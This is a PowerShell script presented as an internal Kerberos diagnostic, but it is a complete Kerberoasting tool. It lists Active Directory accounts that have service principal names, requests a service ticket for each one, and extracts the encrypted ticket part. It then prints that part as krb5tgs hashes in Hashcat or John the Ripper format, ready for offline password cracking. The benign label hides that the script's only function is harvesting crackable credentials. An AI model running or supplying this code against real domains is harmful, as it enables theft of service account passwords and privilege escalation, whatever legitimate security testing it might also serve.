<#
Version:
  1.0.0

Usage:
  .\ker.ps1
  .\ker.ps1 -Domain contoso.local
  .\ker.ps1 -Domain contoso.local -Server dc01.contoso.local
  .\ker.ps1 -Domain contoso.local -SearchBase "OU=Servers,DC=contoso,DC=local"

Purpose:
  Minimal internal diagnostic for confirming that SPN-backed service account
  ticket hashes can be requested and parsed successfully.

Output:
  [+] SamAccountName : Hash
  [!] SamAccountName : reason
#>

[CmdletBinding()]
param(
    [string]$Domain,

    [string]$Server,

    [string]$SearchBase,

    [ValidateSet('Hashcat', 'John')]
    [string]$OutputFormat = 'Hashcat'
)

Add-Type -AssemblyName System.DirectoryServices
Add-Type -AssemblyName System.IdentityModel

$ScriptVersion = '1.0.0'

function Stop-Script {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message
    )

    Write-Host $Message -ForegroundColor Red
    exit 1
}

function Convert-DomainToDn {
    param(
        [Parameter(Mandatory = $true)]
        [string]$DomainName
    )

    return ($DomainName.Split('.') | ForEach-Object { "DC=$_" }) -join ','
}

function Get-DefaultDomainName {
    try {
        return [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    }
    catch {
        Stop-Script "Unable to determine the current domain. Specify -Domain explicitly."
    }
}

function Get-DirectorySearcher {
    param(
        [string]$TargetDomain,
        [string]$TargetServer,
        [string]$TargetSearchBase
    )

    if ([string]::IsNullOrWhiteSpace($TargetDomain)) {
        $TargetDomain = Get-DefaultDomainName
    }

    $searchRoot = $null

    if (-not [string]::IsNullOrWhiteSpace($TargetSearchBase)) {
        if ($TargetSearchBase -match '^LDAP://') {
            $searchRoot = $TargetSearchBase
        }
        else {
            if ($TargetSearchBase -match '^[A-Za-z]+=' ) {
                if ($TargetServer) {
                    $searchRoot = "LDAP://$TargetServer/$TargetSearchBase"
                }
                else {
                    $searchRoot = "LDAP://$TargetSearchBase"
                }
            }
            else {
                if ($TargetServer) {
                    $searchRoot = "LDAP://$TargetServer/$TargetSearchBase"
                }
                else {
                    $searchRoot = "LDAP://$TargetSearchBase"
                }
            }
        }
    }
    else {
        $domainDn = Convert-DomainToDn -DomainName $TargetDomain
        if ($TargetServer) {
            $searchRoot = "LDAP://$TargetServer/$domainDn"
        }
        else {
            $searchRoot = "LDAP://$domainDn"
        }
    }

    $root = New-Object System.DirectoryServices.DirectoryEntry($searchRoot)
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
    $searcher.PageSize = 1000
    $searcher.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    $searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::None
    $searcher.CacheResults = $false

    return $searcher
}

function Get-ServiceAccounts {
    param(
        [string]$TargetDomain,
        [string]$TargetServer,
        [string]$TargetSearchBase
    )

    $searcher = Get-DirectorySearcher -TargetDomain $TargetDomain -TargetServer $TargetServer -TargetSearchBase $TargetSearchBase
    try {
        $searcher.Filter = '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'
        [void]$searcher.PropertiesToLoad.Add('samaccountname')
        [void]$searcher.PropertiesToLoad.Add('distinguishedname')
        [void]$searcher.PropertiesToLoad.Add('serviceprincipalname')

        foreach ($entry in $searcher.FindAll()) {
            $spnValues = @($entry.Properties['serviceprincipalname'] | ForEach-Object { [string]$_ } | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
            if ($spnValues.Count -eq 0) {
                continue
            }

            [PSCustomObject]@{
                SamAccountName     = [string]$entry.Properties['samaccountname'][0]
                DistinguishedName  = [string]$entry.Properties['distinguishedname'][0]
                ServicePrincipalName = $spnValues[0]
            }
        }
    }
    finally {
        if ($searcher) {
            $searcher.Dispose()
        }
    }
}

function Convert-TicketToHash {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory = $true)]
        [string]$SamAccountName,

        [Parameter(Mandatory = $true)]
        [string]$DistinguishedName,

        [Parameter(Mandatory = $true)]
        [ValidateSet('Hashcat', 'John')]
        [string]$Format
    )

    $ticket = $null

    try {
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $ServicePrincipalName
    }
    catch {
        return [PSCustomObject]@{
            SamAccountName = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName = $DistinguishedName
            Hash = $null
            Error = $_.Exception.Message
        }
    }

    $ticketBytes = $ticket.GetRequest()
    if (-not $ticketBytes) {
        return [PSCustomObject]@{
            SamAccountName = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName = $DistinguishedName
            Hash = $null
            Error = 'Ticket bytes were empty.'
        }
    }

    $ticketHex = [System.BitConverter]::ToString($ticketBytes) -replace '-'

    if ($ticketHex -notmatch 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
        return [PSCustomObject]@{
            SamAccountName = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName = $DistinguishedName
            Hash = $null
            Error = 'Unable to parse ticket structure.'
        }
    }

    $etype = [Convert]::ToByte($Matches.EtypeLen, 16)
    $cipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16) - 4
    $cipherText = $Matches.DataToEnd.Substring(0, $cipherTextLen * 2)

    if ($Matches.DataToEnd.Substring($cipherTextLen * 2, 4) -ne 'A482') {
        return [PSCustomObject]@{
            SamAccountName = $SamAccountName
            ServicePrincipalName = $ServicePrincipalName
            DistinguishedName = $DistinguishedName
            Hash = $null
            Error = 'Unable to verify the ticket ciphertext boundary.'
        }
    }

    if ($Format -eq 'John') {
        $hash = "`$krb5tgs`$${ServicePrincipalName}:$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
    }
    else {
        if ($DistinguishedName -match 'DC=') {
            $domainName = ($DistinguishedName.Substring($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.')
        }
        else {
            $domainName = 'UNKNOWN'
        }

        $hash = "`$krb5tgs`$$etype`$*$SamAccountName`$$domainName`$$ServicePrincipalName*`$$($cipherText.Substring(0,32))`$$($cipherText.Substring(32))"
    }

    return [PSCustomObject]@{
        SamAccountName = $SamAccountName
        ServicePrincipalName = $ServicePrincipalName
        DistinguishedName = $DistinguishedName
        Hash = $hash
        Error = $null
    }
}

if ($PSBoundParameters.ContainsKey('Domain') -and [string]::IsNullOrWhiteSpace($Domain)) {
    Stop-Script "Domain cannot be empty."
}

$resolvedDomain = if ([string]::IsNullOrWhiteSpace($Domain)) { Get-DefaultDomainName } else { $Domain }

Write-Host ("Kerberos Ticket Diagnostic v{0}" -f $ScriptVersion)

$serviceAccounts = @(Get-ServiceAccounts -TargetDomain $resolvedDomain -TargetServer $Server -TargetSearchBase $SearchBase)

if ($serviceAccounts.Count -eq 0) {
    Write-Host "No service accounts with SPNs were found."
    exit 0
}

$successCount = 0
$failureCount = 0

foreach ($account in $serviceAccounts) {
    $result = Convert-TicketToHash -ServicePrincipalName $account.ServicePrincipalName -SamAccountName $account.SamAccountName -DistinguishedName $account.DistinguishedName -Format $OutputFormat

    if ($result.Hash) {
        $successCount++
        Write-Host ("[+] {0} : {1}" -f $result.SamAccountName, $result.Hash)
    }
    else {
        $failureCount++
        Write-Host ("[!] {0} : {1}" -f $result.SamAccountName, $result.Error)
    }
}

Write-Host ""
Write-Host ("Service accounts found : {0}" -f $serviceAccounts.Count)
Write-Host ("Hashes retrieved       : {0}" -f $successCount)
Write-Host ("Failures               : {0}" -f $failureCount)
